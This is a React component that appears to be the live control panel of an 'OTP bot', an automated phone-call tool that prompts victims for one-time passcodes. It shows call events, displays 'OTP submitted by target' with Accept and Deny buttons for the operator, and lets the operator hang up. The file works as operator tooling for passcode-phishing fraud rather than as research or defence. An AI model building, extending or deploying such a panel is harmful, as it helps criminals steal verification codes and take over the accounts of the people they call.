import React, { useState, useEffect } from 'react';
import { Button } from './ui/button';
import { Phone, PhoneOff } from 'lucide-react';
import api from '../services/api';
import { toast } from 'sonner';

export default function LiveCallMonitor({ callId, callData, onClose }) {
  const [events, setEvents] = useState([]);
  const [otpCode, setOtpCode] = useState(null);
  const [showAcceptDeny, setShowAcceptDeny] = useState(false);
  const [callStatus, setCallStatus] = useState('initiated');
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    // Poll for call updates every 1 second for real-time feel
    const interval = setInterval(async () => {
      try {
        const response = await api.get(`/calls/${callId}`);
        const call = response.data;
        
        // Update events
        const callEvents = call.events || [];
        setEvents(callEvents.reverse()); // Newest first
        setCallStatus(call.status || 'initiated');
        
        // Check for OTP
        if (call.otp_code && !showAcceptDeny) {
          setOtpCode(call.otp_code);
          setShowAcceptDeny(true);
        }
        
        setIsLoading(false);
        
        // Stop polling if call is completed
        if (call.status === 'completed' || call.status === 'failed') {
          clearInterval(interval);
        }
      } catch (error) {
        console.error('Error fetching call data:', error);
      }
    }, 1000);

    return () => clearInterval(interval);
  }, [callId, showAcceptDeny]);

  const handleAccept = async () => {
    try {
      await api.post(`/calls/${callId}/accept`);
      toast.success('OTP Accepted');
      setShowAcceptDeny(false);
    } catch (error) {
      toast.error('Failed to accept');
    }
  };

  const handleDeny = async () => {
    try {
      await api.post(`/calls/${callId}/deny`);
      toast.success('OTP Denied');
      setShowAcceptDeny(false);
    } catch (error) {
      toast.error('Failed to deny');
    }
  };

  const handleHangup = async () => {
    try {
      await api.post(`/calls/${callId}/hangup`);
      toast.success('Call terminated');
      onClose();
    } catch (error) {
      toast.error('Failed to hangup call');
    }
  };

  const getEventIcon = (eventType) => {
    switch(eventType) {
      case 'call_initiated': return '📱';
      case 'call_ringing': return '📞';
      case 'call_answered': return '☎️';
      case 'human_detected': return '🙋';
      case 'machine_detected': return '🤖';
      case 'unknown_detected': return '🔍';
      case 'message_played': return '🔊';
      case 'first_input_received': return '1️⃣';
      case 'otp_received': return '🕵️';
      case 'call_completed': return '🏁';
      default: return '📋';
    }
  };

  return (
    <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
      <div className="bg-[#0a0a0a] border border-green-500/30 rounded-xl p-6 max-w-4xl w-full max-h-[90vh] overflow-hidden flex flex-col">
        {/* Header */}
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-2xl font-bold text-green-400">🤖 Bot Logs</h2>
          <Button onClick={onClose} variant="ghost" className="text-gray-400 hover:text-white">
            ✕
          </Button>
        </div>

        {/* OTP Accept/Deny Section */}
        {showAcceptDeny && otpCode && (
          <div className="mb-4 p-6 bg-gradient-to-r from-orange-900/30 to-yellow-900/30 border border-yellow-600/50 rounded-lg">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-yellow-300 font-semibold text-lg mb-2">🕵️ OTP submitted by target: {otpCode}</p>
              </div>
              <div className="flex gap-3">
                <Button 
                  onClick={handleAccept}
                  className="bg-green-600 hover:bg-green-700 text-white px-6 py-2"
                  data-testid="accept-button"
                >
                  ✅ Accept
                </Button>
                <Button 
                  onClick={handleDeny}
                  className="bg-red-600 hover:bg-red-700 text-white px-6 py-2"
                  data-testid="deny-button"
                >
                  ❌ Deny
                </Button>
              </div>
            </div>
          </div>
        )}

        {/* Bot Logs Timeline */}
        <div className="flex-1 overflow-y-auto bg-[#0a0a0a] border border-green-500/30 rounded-lg p-4 mb-4">
          <div className="space-y-2">
            {events.length === 0 ? (
              <p className="text-gray-500 text-center py-8">Waiting for call events...</p>
            ) : (
              events.map((event, index) => (
                <div key={index} className="flex items-start gap-3 text-sm py-2 border-b border-gray-800/50 last:border-0">
                  <span className="text-2xl">{getEventIcon(event.event)}</span>
                  <div className="flex-1">
                    <p className="text-gray-300">{event.message || event.event}</p>
                    <p className="text-gray-600 text-xs mt-1">@ {new Date(event.time).toLocaleTimeString()}</p>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>

        {/* Call Info Footer */}
        <div className="grid grid-cols-3 gap-3 text-xs mb-4">
          <div>
            <span className="text-gray-500">Status:</span>
            <span className="text-green-400 ml-2 font-medium uppercase">{callStatus}</span>
          </div>
          <div>
            <span className="text-gray-500">From:</span>
            <span className="text-white ml-2">{callData.from_number}</span>
          </div>
          <div>
            <span className="text-gray-500">To:</span>
            <span className="text-white ml-2">{callData.to_number}</span>
          </div>
        </div>

        {/* Action Buttons */}
        <div className="flex gap-3">
          <Button
            onClick={handleHangup}
            className="flex-1 bg-blue-600 hover:bg-blue-700 text-white"
            data-testid="hangup-button"
          >
            <PhoneOff className="w-4 h-4 mr-2" />
            HangUp
          </Button>
          <Button
            variant="outline"
            className="px-6 border-green-600 text-green-400 hover:bg-green-900/30"
          >
            Clear Logs
          </Button>
        </div>

        {/* Loading Footer */}
        {isLoading && (
          <div className="mt-3 text-center text-gray-500 text-xs">
            Fetching data. Please do not refresh browser.
          </div>
        )}
      </div>
    </div>
  );
}
